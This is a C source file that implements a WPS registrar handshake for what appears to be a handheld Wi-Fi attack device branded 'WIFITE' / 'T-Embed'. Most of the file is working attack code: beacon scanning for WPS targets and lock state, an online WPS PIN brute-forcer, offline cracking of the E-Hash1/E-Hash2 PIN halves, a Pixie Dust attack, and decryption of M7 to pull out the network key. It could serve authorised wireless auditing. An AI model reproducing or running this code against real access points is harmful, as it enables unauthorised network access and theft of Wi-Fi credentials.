/* Native, bounded WPS registrar exchange. No Linux process/runtime dependency.
 * Public protocol constants: WSC v1.0; DH group 5: RFC 3526 section 2.
 * MIT, 2026. */
#include "core.h"
#include <mbedtls/aes.h>
#include <mbedtls/bignum.h>
#include <mbedtls/md.h>
#include <mbedtls/sha256.h>
#include <stdio.h>
#include <string.h>

uint16_t wf_be16(const uint8_t *p) { return (uint16_t)((p[0] << 8) | p[1]); }
static uint16_t le16(const uint8_t *p) { return (uint16_t)(p[0] | p[1] << 8); }
static void be16(uint8_t *p, unsigned v) {
  p[0] = v >> 8;
  p[1] = v;
}
void wf_wipe(void *p, size_t n) {
  volatile uint8_t *q = p;
  while (n--)
    *q++ = 0;
}
static bool eq(const void *a, const void *b, size_t n) {
  const uint8_t *x = a, *y = b;
  unsigned d = 0;
  while (n--)
    d |= *x++ ^ *y++;
  return d == 0;
}
bool wf_tlv_valid(const uint8_t *p, size_t n) {
  if (!p)
    return false;
  while (n) {
    if (n < 4)
      return false;
    size_t z = wf_be16(p + 2);
    if (z > n - 4)
      return false;
    p += 4 + z;
    n -= 4 + z;
  }
  return true;
}
const uint8_t *wf_attr(const uint8_t *p, size_t n, uint16_t tag, size_t *len) {
  const uint8_t *found = NULL;
  size_t size = 0;
  if (!wf_tlv_valid(p, n))
    return NULL;
  while (n) {
    size_t z = wf_be16(p + 2);
    if (wf_be16(p) == tag) {
      if (found)
        return NULL;
      found = p + 4;
      size = z;
    }
    p += 4 + z;
    n -= 4 + z;
  }
  if (found && len)
    *len = size;
  return found;
}
static const uint8_t *attr(const uint8_t *p, size_t n, unsigned tag,
                           size_t want) {
  size_t z = 0;
  const uint8_t *q = wf_attr(p, n, tag, &z);
  return q && z == want ? q : NULL;
}
static void str_attr(char *d, size_t cap, const uint8_t *p, size_t n,
                     unsigned tag) {
  size_t z = 0;
  const uint8_t *q = wf_attr(p, n, tag, &z);
  if (!q)
    return;
  if (z >= cap)
    z = cap - 1;
  for (size_t i = 0; i < z; i++)
    d[i] = (q[i] >= 32 && q[i] < 127) ? q[i] : '?';
  d[z] = 0;
}
bool wf_scan_beacon(const uint8_t *p, size_t n, WfTarget *o) {
  if (!p || !o || n < 36 || (p[0] != 0x80 && p[0] != 0x50) || (p[1] & 0x43))
    return false;
  uint8_t wps[512];
  size_t wn = 0;
  bool ssid = false;
  memset(o, 0, sizeof(*o));
  o->locked = -1;
  memcpy(o->bssid, p + 16, 6);
  o->capability = le16(p + 34);
  for (size_t i = 36; i < n;) {
    if (n - i < 2 || p[i + 1] > n - i - 2)
      return false;
    size_t z = p[i + 1];
    const uint8_t *q = p + i + 2;
    if (p[i] == 0) {
      if (ssid || z > 32)
        return false;
      ssid = true;
      o->ssid_len = z;
      memcpy(o->ssid, q, z);
    } else if (p[i] == 3 && z == 1)
      o->channel = q[0];
    else if (p[i] == 221 && z >= 4 && !memcmp(q, "\x00\x50\xf2\x04", 4)) {
      if (z - 4 > sizeof(wps) - wn)
        return false;
      memcpy(wps + wn, q + 4, z - 4);
      wn += z - 4;
    }
    i += 2 + z;
  }
  if (!wf_tlv_valid(wps, wn))
    return false;
  o->wps = wn != 0;
  const uint8_t *q = attr(wps, wn, 0x104a, 1);
  if (q)
    o->version = *q;
  q = attr(wps, wn, 0x1057, 1);
  if (q && *q <= 1)
    o->locked = *q;
  q = attr(wps, wn, 0x1041, 1);
  if (q)
    o->selected = *q;
  q = attr(wps, wn, 0x1008, 2);
  if (q)
    o->methods = wf_be16(q);
  str_attr(o->manufacturer, sizeof(o->manufacturer), wps, wn, 0x1021);
  str_attr(o->model, sizeof(o->model), wps, wn, 0x1023);
  return ssid;
}
bool wf_beacon(const uint8_t *p, size_t n, WfTarget *o) {
  return wf_scan_beacon(p, n, o) && o->wps;
}
WfLockState wf_lock_observe(WfLockWatch *w, int8_t value,
                            uint16_t sequence, uint32_t captured_at) {
  if (!w || value < -1 || value > 1)
    return WfLockPending;
  if (w->have && ((int32_t)(captured_at - w->last_at) < 0 ||
                  sequence == w->sequence))
    return WfLockPending;
  if (!w->have || w->value != value) {
    w->samples = 0;
    w->first_at = captured_at;
  }
  w->have = true;
  w->value = value;
  w->sequence = sequence;
  w->last_at = captured_at;
  if (w->samples < 255)
    w->samples++;
  if (value == 1)
    w->saw_lock = true;
  if (w->samples < 2 || captured_at - w->first_at < 250)
    return WfLockPending;
  if (value == 0)
    return WfLockClear;
  if (value == 1)
    return WfLockSet;
  return w->saw_lock ? WfLockPending : WfLockUnknown;
}
WfEap wf_eap(const uint8_t *p, size_t n, const uint8_t *ap,
             const uint8_t *sta) {
  WfEap e = {0};
  if (!p || n < 24 || (p[0] & 0x0c) != 8 || (p[1] & 3) != 2 || (p[1] & 0x44))
    return e;
  if (memcmp(p + 4, sta, 6) || memcmp(p + 10, ap, 6) || memcmp(p + 16, ap, 6))
    return e;
  if (le16(p + 22) & 15)
    return e; /* 802.11 fragmentation is not reassembled */
  size_t h = 24;
  if (p[0] & 0x80) {
    if (n < h + 2 || (p[h] & 0x80))
      return e;
    h += 2;
    if (p[1] & 0x80)
      h += 4;
  }
  if (n < h + 12 || memcmp(p + h, "\xaa\xaa\x03\x00\x00\x00\x88\x8e", 8))
    return e;
  return wf_eapol(p + h + 8, n - h - 8);
}
WfEap wf_eapol(const uint8_t *p, size_t n) {
  WfEap e = {0};
  if (!p || n < 4)
    return e;
  if (p[1] != 0 || wf_be16(p + 2) > n - 4)
    return e;
  n = wf_be16(p + 2);
  p += 4;
  if (n < 4 || wf_be16(p + 2) != n)
    return e;
  e.id = p[1];
  if (p[0] == 4) {
    e.kind = WfEapFailure;
    return e;
  }
  if (p[0] != 1 || n < 5)
    return e;
  if (p[4] == 1) {
    e.kind = WfIdentity;
    return e;
  }
  if (n < 14 || memcmp(p + 4, "\xfe\x00\x37\x2a\x00\x00\x00\x01", 8))
    return e;
  e.opcode = p[12];
  size_t off = 14;
  if (p[13] & ~3u)
    return (WfEap){0};
  e.flags = p[13];
  if (p[13] & 2) {
    if (n < 16)
      return (WfEap){0};
    e.total = wf_be16(p + 14);
    off = 16;
    if (!(p[13] & 1) && e.total != n - off)
      return (WfEap){0};
  }
  e.kind = WfWsc;
  e.data = p + off;
  e.len = n - off;
  return e;
}
size_t wf_eapol_response(uint8_t *out, size_t cap, int kind, uint8_t id,
                         uint8_t op, const uint8_t *message, size_t n) {
  const char identity[] = "WFA-SimpleConfig-Registrar-1-0";
  if (!out || kind < 0 || kind > 2 || n > WF_MSG_MAX || (n && !message))
    return 0;
  size_t body = kind == 0 ? 0 : kind == 1 ? 5 + sizeof(identity) - 1 : 14 + n;
  if (cap < 4 + body)
    return 0;
  out[0] = 1;
  out[1] = kind == 0 ? 1 : 0;
  be16(out + 2, body);
  if (!kind)
    return 4;
  out[4] = 2;
  out[5] = id;
  be16(out + 6, body);
  if (kind == 1) {
    out[8] = 1;
    memcpy(out + 9, identity, sizeof(identity) - 1);
  } else {
    const uint8_t expanded[] = {254, 0, 0x37, 0x2a, 0, 0, 0, 1};
    memcpy(out + 8, expanded, 8);
    out[16] = op;
    out[17] = 0;
    if (n)
      memcpy(out + 18, message, n);
  }
  return 4 + body;
}
int wf_reassemble(WfFragments *f, WfEap *e) {
  if (!f || !e || e->kind != WfWsc || e->opcode != 4 || (e->flags & ~3u) ||
      (!e->data && e->len))
    return -1;
  if (f->have && e->id == f->id) {
    if (e->flags != f->flags || e->total != f->declared ||
        e->len != f->last_len ||
        memcmp(e->data, f->data + f->last_offset, e->len))
      return -1;
    return 2;
  }
  if (e->flags & 2) {
    if (f->active || !e->total || e->total > WF_MSG_MAX)
      return -1;
    f->used = 0;
    f->total = e->total;
    f->active = true;
  }
  if (!f->active) {
    f->have = false;
    return (e->flags || e->len > WF_MSG_MAX) ? -1 : 1;
  }
  if (!e->len || f->used > f->total || e->len > f->total - f->used)
    return -1;
  f->last_offset = f->used;
  f->last_len = e->len;
  f->id = e->id;
  f->flags = e->flags;
  f->declared = e->total;
  f->have = true;
  memcpy(f->data + f->used, e->data, e->len);
  f->used += e->len;
  if (e->flags & 1)
    return f->used < f->total ? 0 : -1;
  if (f->used != f->total)
    return -1;
  f->active = false;
  e->data = f->data;
  e->len = f->used;
  return 1;
}
static bool hmac(const uint8_t *key, size_t kn, const void *p, size_t n,
                 uint8_t out[32]) {
  return mbedtls_md_hmac(mbedtls_md_info_from_type(MBEDTLS_MD_SHA256), key, kn,
                         p, n, out) == 0;
}
static bool mac2(const uint8_t key[32], const uint8_t *a, size_t an,
                 const uint8_t *b, size_t bn, uint8_t out[32]) {
  mbedtls_md_context_t c;
  mbedtls_md_init(&c);
  bool ok = mbedtls_md_setup(&c, mbedtls_md_info_from_type(MBEDTLS_MD_SHA256),
                             1) == 0 &&
            mbedtls_md_hmac_starts(&c, key, 32) == 0 &&
            mbedtls_md_hmac_update(&c, a, an) == 0 &&
            mbedtls_md_hmac_update(&c, b, bn) == 0 &&
            mbedtls_md_hmac_finish(&c, out) == 0;
  mbedtls_md_free(&c);
  return ok;
}
static const char prime5[] =
    "FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B"
    "139B22514A08798E3404DDEF9519B3CD"
    "3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF"
    "5CB6F406B7EDEE386BFB5A899FA5AE9F"
    "24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF"
    "5F83655D23DCA3AD961C62F356208552B"
    "B9ED529077096966D670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF";
static bool keys(WfSession *s, const uint8_t x[32]) {
  mbedtls_mpi p, g, y, k, v, t;
  mbedtls_mpi_init(&p);
  mbedtls_mpi_init(&g);
  mbedtls_mpi_init(&y);
  mbedtls_mpi_init(&k);
  mbedtls_mpi_init(&v);
  mbedtls_mpi_init(&t);
  uint8_t secret[192], dh[32], kdk[32], a[38], d[96];
  bool ok = false;
  if (mbedtls_mpi_read_string(&p, 16, prime5) || mbedtls_mpi_lset(&g, 2) ||
      mbedtls_mpi_read_binary(&y, s->pke, 192) ||
      mbedtls_mpi_read_binary(&k, x, 32) || mbedtls_mpi_sub_int(&t, &p, 2) ||
      mbedtls_mpi_cmp_int(&y, 2) < 0 || mbedtls_mpi_cmp_mpi(&y, &t) > 0 ||
      mbedtls_mpi_cmp_int(&k, 2) < 0)
    goto done;
  if (mbedtls_mpi_exp_mod(&v, &g, &k, &p, NULL) ||
      mbedtls_mpi_write_binary(&v, s->pkr, 192) ||
      mbedtls_mpi_exp_mod(&v, &y, &k, &p, NULL) ||
      mbedtls_mpi_write_binary(&v, secret, 192))
    goto done;
  if (mbedtls_sha256(secret, 192, dh, 0))
    goto done;
  memcpy(a, s->enonce, 16);
  memcpy(a + 16, s->mac, 6);
  memcpy(a + 22, s->rnonce, 16);
  if (!hmac(dh, 32, a, 38, kdk))
    goto done;
  const char label[] = "Wi-Fi Easy and Secure Key Derivation";
  uint8_t in[4 + sizeof(label) - 1 + 4];
  memset(in, 0, sizeof(in));
  memcpy(in + 4, label, sizeof(label) - 1);
  in[sizeof(in) - 2] = 2;
  in[sizeof(in) - 1] = 0x80; /* 640 bits */
  for (unsigned i = 0; i < 3; i++) {
    in[3] = i + 1;
    if (!hmac(kdk, 32, in, sizeof(in), d + i * 32))
      goto done;
  }
  memcpy(s->auth, d, 32);
  memcpy(s->wrap, d + 32, 16);
  ok = true;
done:
  wf_wipe(secret, sizeof(secret));
  wf_wipe(dh, sizeof(dh));
  wf_wipe(kdk, sizeof(kdk));
  wf_wipe(d, sizeof(d));
  mbedtls_mpi_free(&p);
  mbedtls_mpi_free(&g);
  mbedtls_mpi_free(&y);
  mbedtls_mpi_free(&k);
  mbedtls_mpi_free(&v);
  mbedtls_mpi_free(&t);
  return ok;
}
typedef struct {
  uint8_t *p;
  size_t n;
  bool bad;
} Builder;
static void put(Builder *b, unsigned tag, const void *data, size_t n) {
  if (b->bad || n > WF_MSG_MAX - 4 || b->n > WF_MSG_MAX - 4 - n) {
    b->bad = true;
    return;
  }
  be16(b->p + b->n, tag);
  be16(b->p + b->n + 2, n);
  memcpy(b->p + b->n + 4, data, n);
  b->n += n + 4;
}
static void p8(Builder *b, unsigned tag, unsigned val) {
  uint8_t v = val;
  put(b, tag, &v, 1);
}
static void p16(Builder *b, unsigned tag, unsigned val) {
  uint8_t v[2];
  be16(v, val);
  put(b, tag, v, 2);
}
static void base(Builder *b, unsigned type) {
  p8(b, 0x104a, 0x10);
  p8(b, 0x1022, type);
}
static bool finish(WfSession *s, Builder *b, const uint8_t *prev, size_t prev_n,
                   size_t *n) {
  uint8_t h[32];
  if (b->bad || !mac2(s->auth, prev, prev_n, b->p, b->n, h))
    return false;
  put(b, 0x1005, h, 8);
  wf_wipe(h, 32);
  if (b->bad)
    return false;
  memcpy(s->last, b->p, b->n);
  s->last_len = b->n;
  *n = b->n;
  return true;
}
static bool verify(WfSession *s, const uint8_t *m, size_t n, unsigned type) {
  const uint8_t *t = attr(m, n, 0x1022, 1), *r = attr(m, n, 0x1039, 16),
                *a = attr(m, n, 0x1005, 8);
  if (!t || *t != type || !r || !eq(r, s->rnonce, 16) || !a || n < 12 ||
      a != m + n - 8)
    return false;
  uint8_t h[32];
  bool ok = mac2(s->auth, s->last, s->last_len, m, n - 12, h) && eq(h, a, 8);
  wf_wipe(h, 32);
  return ok;
}
bool wf_m2(WfSession *s, const uint8_t *m, size_t n, const uint8_t x[32],
           const uint8_t r[16], uint8_t *out, size_t *out_n) {
  if (n > WF_MSG_MAX)
    return false;
  const uint8_t *t = attr(m, n, 0x1022, 1), *e = attr(m, n, 0x101a, 16),
                *pk = attr(m, n, 0x1032, 192), *mac = attr(m, n, 0x1020, 6),
                *af = attr(m, n, 0x1004, 2), *ef = attr(m, n, 0x1010, 2);
  if (!t || *t != 4 || !e || !pk || !mac || !af || !ef)
    return false;
  memset(s, 0, sizeof(*s));
  memcpy(s->pke, pk, 192);
  memcpy(s->mac, mac, 6);
  memcpy(s->enonce, e, 16);
  memcpy(s->rnonce, r, 16);
  memcpy(s->uuid, r, 16);
  s->uuid[6] = (s->uuid[6] & 15) | 0x40;
  s->uuid[8] = (s->uuid[8] & 63) | 0x80;
  s->auth_flags = wf_be16(af) & 0x23;
  s->encr_flags = wf_be16(ef) & 0x0d;
  if (!s->auth_flags || !s->encr_flags || !keys(s, x))
    return false;
  Builder b = {.p = out};
  base(&b, 5);
  put(&b, 0x101a, s->enonce, 16);
  put(&b, 0x1039, s->rnonce, 16);
  put(&b, 0x1048, s->uuid, 16);
  put(&b, 0x1032, s->pkr, 192);
  p16(&b, 0x1004, s->auth_flags);
  p16(&b, 0x1010, s->encr_flags);
  p8(&b, 0x100d, 1);
  p16(&b, 0x1008, 0x010c);
  put(&b, 0x1021, "WIFITE", 6);
  put(&b, 0x1023, "T-Embed", 7);
  put(&b, 0x1024, "0.1", 3);
  put(&b, 0x1042, "1", 1);
  const uint8_t dev[8] = {0, 1, 0, 0x50, 0xf2, 4, 0, 1};
  put(&b, 0x1054, dev, 8);
  put(&b, 0x1011, "WIFITE", 6);
  p8(&b, 0x103c, 1);
  p16(&b, 0x1002, 0);
  p16(&b, 0x1009, 0);
  p16(&b, 0x1012, 0);
  const uint8_t os[4] = {0x80, 0, 0, 1};
  put(&b, 0x102d, os, 4);
  if (!finish(s, &b, m, n, out_n))
    return false;
  s->stage = 2;
  return true;
}
bool wf_m3(WfSession *s, const uint8_t *m, size_t n) {
  if (s->stage != 2 || n > WF_MSG_MAX || !verify(s, m, n, 7))
    return false;
  const uint8_t *a = attr(m, n, 0x1014, 32), *b = attr(m, n, 0x1015, 32);
  if (!a || !b)
    return false;
  memcpy(s->ehash1, a, 32);
  memcpy(s->ehash2, b, 32);
  memcpy(s->last, m, n);
  s->last_len = n;
  s->stage = 3;
  return true;
}
unsigned wf_checksum(unsigned p) {
  unsigned a = 0;
  while (p) {
    a += 3 * (p % 10);
    p /= 10;
    a += p % 10;
    p /= 10;
  }
  return (10 - a % 10) % 10;
}
bool wf_brute_pin(const WfBrute *b, char pin[9]) {
  if (!b || !pin || b->first >= 10000 || b->second >= 1000 || b->phase > 1 ||
      (!b->phase && b->second))
    return false;
  unsigned n = b->first * 1000 + b->second;
  snprintf(pin, 9, "%07u%u", n, wf_checksum(n));
  return true;
}
bool wf_brute_next(WfBrute *b, unsigned evidence) {
  char pin[9];
  if (!wf_brute_pin(b, pin))
    return false;
  if (evidence == 1 && !b->phase) {
    b->first++;
    return true;
  }
  if (evidence == 2) {
    b->phase = 1;
    b->second++;
    return true;
  }
  return false; /* timeout, lock, or contradictory first-half rejection */
}
static bool pin_hash(WfSession *s, const uint8_t nonce[16], const char *pin,
                     size_t pn, uint8_t out[32]) {
  uint8_t psk[32], msg[416];
  if (!hmac(s->auth, 32, pin, pn, psk))
    return false;
  memcpy(msg, nonce, 16);
  memcpy(msg + 16, psk, 16);
  memcpy(msg + 32, s->pke, 192);
  memcpy(msg + 224, s->pkr, 192);
  bool ok = hmac(s->auth, 32, msg, sizeof(msg), out);
  wf_wipe(psk, 32);
  wf_wipe(msg, sizeof(msg));
  return ok;
}
/* Return 1 for numeric half, 2 for empty half, 0 for no match, negative on
 * cancellation/error. Full second half includes non-checksummed vendor PINs. */
int wf_crack_first(WfSession *s, const uint8_t nonce[16], WfYield cb,
                   void *ctx) {
  uint8_t h[32];
  s->pin[0] = 0;
  if (!pin_hash(s, nonce, "", 0, h))
    return -2;
  if (eq(h, s->ehash1, 32))
    return 2;
  for (unsigned i = 0; i < 10000; i++) {
    if ((i & 31) == 0 && cb && !cb(ctx, i, 10000))
      return -1;
    snprintf(s->pin, 5, "%04u", i);
    if (!pin_hash(s, nonce, s->pin, 4, h))
      return -2;
    if (eq(h, s->ehash1, 32)) {
      wf_wipe(h, 32);
      return 1;
    }
  }
  s->pin[0] = 0;
  wf_wipe(h, 32);
  return 0;
}
int wf_crack_second(WfSession *s, const uint8_t nonce[16], WfYield cb,
                    void *ctx) {
  uint8_t h[32];
  if (!s->pin[0]) {
    if (!pin_hash(s, nonce, "", 0, h))
      return -2;
    return eq(h, s->ehash2, 32) ? 2 : 0;
  }
  unsigned first = 0;
  for (unsigned i = 0; i < 4; i++)
    first = first * 10 + (s->pin[i] - '0');
  for (unsigned i = 0; i < 11000; i++) {
    if ((i & 31) == 0 && cb && !cb(ctx, i, 11000))
      return -1;
    unsigned second =
        i < 1000 ? i * 10 + wf_checksum(first * 1000 + i) : i - 1000;
    if (i >= 1000 && wf_checksum(first * 1000 + second / 10) == second % 10)
      continue;
    snprintf(s->pin + 4, 5, "%04u", second);
    if (!pin_hash(s, nonce, s->pin + 4, 4, h))
      return -2;
    if (eq(h, s->ehash2, 32)) {
      wf_wipe(h, 32);
      return 1;
    }
  }
  s->pin[4] = 0;
  wf_wipe(h, 32);
  return 0;
}
int wf_pixie(WfSession *s, WfYield yield, void *ctx) {
  if (s->stage != 3)
    return -2;
  uint8_t nonce[16] = {0}, h[32];
  char half[5];
  for (unsigned model = 0; model < 2; model++) {
    if (model)
      memcpy(nonce, s->enonce, 16);
    int first = -1;
    for (unsigned i = 0; i < 10000; i++) {
      if ((i & 31) == 0 && yield && !yield(ctx, model * 11000 + i, 22000))
        return -1;
      snprintf(half, sizeof(half), "%04u", i);
      if (!pin_hash(s, nonce, half, 4, h))
        return -2;
      if (eq(h, s->ehash1, 32)) {
        first = i;
        break;
      }
    }
    if (first < 0)
      continue;
    for (unsigned i = 0; i < 1000; i++) {
      if ((i & 31) == 0 && yield &&
          !yield(ctx, model * 11000 + 10000 + i, 22000))
        return -1;
      unsigned pin7 = (unsigned)first * 1000 + i;
      snprintf(half, sizeof(half), "%03u%u", i, wf_checksum(pin7));
      if (!pin_hash(s, nonce, half, 4, h))
        return -2;
      if (eq(h, s->ehash2, 32)) {
        snprintf(s->pin, sizeof(s->pin), "%07u%u", pin7, wf_checksum(pin7));
        wf_wipe(h, 32);
        return model + 1;
      }
    }
  }
  wf_wipe(h, 32);
  return 0; /* no match is NOT proof of safety */
}
static bool encrypted(WfSession *s, Builder *b, unsigned tag,
                      const uint8_t secret[16], const uint8_t iv[16]) {
  uint8_t plain[48] = {0}, h[32], enc[64], v[16];
  be16(plain, tag);
  be16(plain + 2, 16);
  memcpy(plain + 4, secret, 16);
  if (!hmac(s->auth, 32, plain, 20, h))
    return false;
  be16(plain + 20, 0x101e);
  be16(plain + 22, 8);
  memcpy(plain + 24, h, 8);
  memset(plain + 32, 16, 16);
  memcpy(v, iv, 16);
  memcpy(enc, iv, 16);
  mbedtls_aes_context a;
  mbedtls_aes_init(&a);
  bool ok = mbedtls_aes_setkey_enc(&a, s->wrap, 128) == 0 &&
            mbedtls_aes_crypt_cbc(&a, MBEDTLS_AES_ENCRYPT, 48, v, plain,
                                  enc + 16) == 0;
  mbedtls_aes_free(&a);
  wf_wipe(plain, sizeof(plain));
  wf_wipe(h, 32);
  if (ok)
    put(b, 0x1018, enc, 64);
  return ok;
}
static bool decrypt(WfSession *s, const uint8_t *m, size_t n, uint8_t *plain,
                    size_t *pn) {
  size_t z = 0;
  const uint8_t *p = wf_attr(m, n, 0x1018, &z);
  if (!p || z < 32 || z > WF_MSG_MAX || z % 16)
    return false;
  uint8_t iv[16];
  memcpy(iv, p, 16);
  z -= 16;
  mbedtls_aes_context a;
  mbedtls_aes_init(&a);
  bool ok =
      mbedtls_aes_setkey_dec(&a, s->wrap, 128) == 0 &&
      mbedtls_aes_crypt_cbc(&a, MBEDTLS_AES_DECRYPT, z, iv, p + 16, plain) == 0;
  mbedtls_aes_free(&a);
  if (!ok)
    return false;
  unsigned pad = plain[z - 1];
  if (!pad || pad > 16 || pad > z)
    return false;
  for (unsigned i = 0; i < pad; i++)
    if (plain[z - 1 - i] != pad)
      return false;
  z -= pad;
  const uint8_t *kwa = attr(plain, z, 0x101e, 8);
  uint8_t h[32];
  if (z < 12 || kwa != plain + z - 8 || !hmac(s->auth, 32, plain, z - 12, h) ||
      !eq(h, kwa, 8))
    return false;
  wf_wipe(h, 32);
  *pn = z;
  return true;
}
bool wf_m4(WfSession *s, const uint8_t random[48], uint8_t *out, size_t *n) {
  if (s->stage != 3 || (strlen(s->pin) != 8 && strlen(s->pin) != 0))
    return false;
  memcpy(s->rs1, random, 16);
  memcpy(s->rs2, random + 16, 16);
  uint8_t h[32];
  Builder b = {.p = out};
  base(&b, 8);
  put(&b, 0x101a, s->enonce, 16);
  size_t half = s->pin[0] ? 4 : 0;
  if (!pin_hash(s, s->rs1, s->pin, half, h))
    return false;
  put(&b, 0x103d, h, 32);
  if (!pin_hash(s, s->rs2, s->pin + half, half, h))
    return false;
  put(&b, 0x103e, h, 32);
  if (!encrypted(s, &b, 0x103f, s->rs1, random + 32) ||
      !finish(s, &b, s->last, s->last_len, n))
    return false;
  s->stage = 4;
  return true;
}
bool wf_m6(WfSession *s, const uint8_t *m, size_t n, const uint8_t iv[16],
           uint8_t *out, size_t *out_n) {
  if (s->stage != 4 || !verify(s, m, n, 9))
    return false;
  uint8_t plain[WF_MSG_MAX], h[32];
  size_t pn = 0;
  bool ok = false;
  if (!decrypt(s, m, n, plain, &pn))
    goto done;
  const uint8_t *es = attr(plain, pn, 0x1016, 16);
  if (!es || !pin_hash(s, es, s->pin, s->pin[0] ? 4 : 0, h) ||
      !eq(h, s->ehash1, 32))
    goto done;
  Builder b = {.p = out};
  base(&b, 10);
  put(&b, 0x101a, s->enonce, 16);
  if (!encrypted(s, &b, 0x1040, s->rs2, iv) || !finish(s, &b, m, n, out_n))
    goto done;
  s->stage = 6;
  ok = true;
done:
  wf_wipe(plain, sizeof(plain));
  wf_wipe(h, 32);
  return ok;
}
bool wf_m7(WfSession *s, const uint8_t *m, size_t n) {
  if (s->stage != 6 || !verify(s, m, n, 11))
    return false;
  uint8_t plain[WF_MSG_MAX], h[32];
  size_t pn = 0;
  bool ok = false;
  if (!decrypt(s, m, n, plain, &pn))
    goto done;
  const uint8_t *es = attr(plain, pn, 0x1017, 16);
  size_t half = s->pin[0] ? 4 : 0;
  if (!es || !pin_hash(s, es, s->pin + half, half, h) || !eq(h, s->ehash2, 32))
    goto done;
  size_t kn = 0;
  const uint8_t *key = wf_attr(plain, pn, 0x1027, &kn);
  if (!key || kn < 1 || kn > 64)
    goto done;
  memcpy(s->key, key, kn);
  s->key[kn] = 0;
  s->key_len = kn;
  s->stage = 7;
  ok = true;
done:
  wf_wipe(plain, sizeof(plain));
  wf_wipe(h, 32);
  return ok;
}
